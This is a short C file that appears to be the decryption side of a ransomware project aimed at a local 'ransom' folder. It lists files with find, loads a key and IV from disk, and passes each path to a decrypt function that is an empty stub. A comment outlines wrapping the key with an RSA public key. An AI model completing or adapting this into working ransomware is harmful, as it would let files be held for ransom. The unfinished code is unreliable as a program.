#include <stdio.h>
#include <stdlib.h>
#include <openssl/evp.h>
#include <openssl/rand.h>
#include <string.h>
#include <math.h>

#define MAX_COMMAND 1024
#define KEY_SIZE 256
#define IV_SIZE 16

void handleErrors() {
    exit(1);
}


int decrypt(char buffer[MAX_COMMAND], unsigned char key[KEY_SIZE / 8], unsigned char iv[IV_SIZE]) {
    return 0;
}

int main() {
    char command[MAX_COMMAND];
    char buffer[MAX_COMMAND];

    // Construct the find command
    snprintf(command, sizeof(command), "find /home/nixiuff/Desktop/ransom/localroot -type f");

    // Open a pipe to the command
    FILE *pipe = popen(command, "r");
    if (pipe == NULL) {
        perror("popen failed");
        return 1;
    }

    unsigned char key[KEY_SIZE / 8];
    unsigned char iv[IV_SIZE];
    
    // ! encrypt the key using a rsa public key and iv and put it into a txt file

// ! FETCH THE KEY AND IV HERE

    FILE *keyFile = fopen("key.dat", "rb");
    FILE *ivFile = fopen("iv.dat", "rb");

    fread(key, sizeof(unsigned char), (KEY_SIZE / 8), keyFile);
    fread(iv, sizeof(unsigned char), IV_SIZE, ivFile);

    fclose(keyFile);
    fclose(ivFile);


    
    // Read the output of the command line by line and store it in a variable
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        // Do something with the file path (e.g., store it in an array)
        //
        //
        buffer[strlen(buffer) - 1] = '\0';

        decrypt(buffer, key, iv);
    }

    // Close the pipe
    pclose(pipe);

    return 0;
}
